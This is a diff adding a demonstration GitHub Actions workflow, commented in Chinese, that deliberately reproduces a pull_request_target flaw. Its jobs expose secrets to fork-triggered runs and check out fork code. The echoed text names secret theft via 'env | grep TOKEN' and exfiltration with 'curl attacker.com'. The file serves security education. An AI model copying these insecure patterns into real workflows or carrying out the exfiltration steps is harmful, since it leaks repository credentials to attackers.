@@ -1,0 +1,83 @@
+# 演示 2：pull_request_target 漏洞（模拟 DDG 的漏洞）
+#
+# 这个 workflow 故意包含 DDG 报告中的漏洞模式
+# 用于演示为什么 pull_request_target + fork checkout 是危险的
+#
+# 漏洞点：
+# 1. 使用 pull_request_target（有 secrets）
+# 2. checkout 了 fork 的代码
+# 3. 在 fork 代码上执行 npm ci（可执行攻击者的 postinstall 脚本）
+
+name: Vulnerable PR Target Demo
+
+on:
+    pull_request_target:                    # ← 危险的 trigger，带 secrets
+        types: [opened, synchronize, closed]
+
+jobs:
+    # ==========================================
+    # 漏洞 Job 1：sync_on_close（模拟 DDG 的 sync_asana_on_close）
+    # 没有 fork 检查，攻击者开 PR 再关闭就能触发
+    # ==========================================
+    sync_on_close:
+        if: github.event.action == 'closed'     # ← 没有 !fork 检查！
+        runs-on: ubuntu-latest
+        steps:
+            - name: Simulate Asana sync
+              env:
+                  FAKE_ASANA_TOKEN: ${{ secrets.MY_SECRET }}      # 模拟 ASANA_ACCESS_TOKEN
+                  FAKE_GH_PAT: ${{ secrets.MY_SECRET }}           # 模拟 GH_RO_PAT
+              run: |
+                  echo "========== sync_on_close 触发 =========="
+                  echo "PR #${{ github.event.pull_request.number }} 已关闭"
+                  echo "这个 job 使用了 pull_request_target，secrets 可用"
+                  echo "FAKE_ASANA_TOKEN 长度 = $(echo -n $FAKE_ASANA_TOKEN | wc -c)"
+                  echo "攻击者只需：fork → 开 PR → 关闭 PR → 这个 job 就跑了"
+
+    # ==========================================
+    # 漏洞 Job 2：auto_respond（模拟 DDG 的 auto_respond）
+    # checkout 了 fork 的代码并执行 npm ci
+    # ==========================================
+    auto_respond:
+        if: github.event.action != 'closed'
+        runs-on: ubuntu-latest
+        steps:
+            - name: Checkout fork code (模拟 DDG 漏洞)
+              uses: actions/checkout@v4
+              with:
+                  repository: ${{ github.event.pull_request.head.repo.full_name }}   # ← fork 的仓库！
+                  ref: ${{ github.event.pull_request.head.ref }}                      # ← fork 的分支
+                  path: attacker-code
+
+            - name: Run attacker code (模拟 npm ci)
+              env:
+                  PRIVACY_CONFIG_PAT: ${{ secrets.MY_SECRET }}    # 模拟泄露的 PAT
+                  ASANA_ACCESS_TOKEN: ${{ secrets.MY_SECRET }}    # 模拟泄露的 token
+              run: |
+                  echo "========== auto_respond 触发 =========="
+                  echo "正在运行 fork 的代码..."
+                  echo ""
+                  echo "攻击者的 package.json postinstall 脚本可以："
+                  echo "1. env | grep TOKEN  →  读取所有 secret"
+                  echo "2. curl attacker.com →  外发到攻击者服务器"
+                  echo ""
+                  echo "当前目录内容（攻击者的代码）："
+                  ls -la attacker-code/
+                  echo ""
+                  if [ -f attacker-code/package.json ]; then
+                      echo "攻击者的 package.json："
+                      cat attacker-code/package.json
+                  fi
+
+    # ==========================================
+    # 安全 Job：正确做法（有 fork 检查）
+    # ==========================================
+    safe_job:
+        if: github.event.action == 'closed' && !github.event.pull_request.head.repo.fork
+        runs-on: ubuntu-latest
+        steps:
+            - name: Safe sync
+              run: |
+                  echo "========== safe_job 触发 =========="
+                  echo "这个 job 有 !fork 检查，fork PR 不会触发"
+                  echo "只有本仓库的 PR 关闭时才会运行"
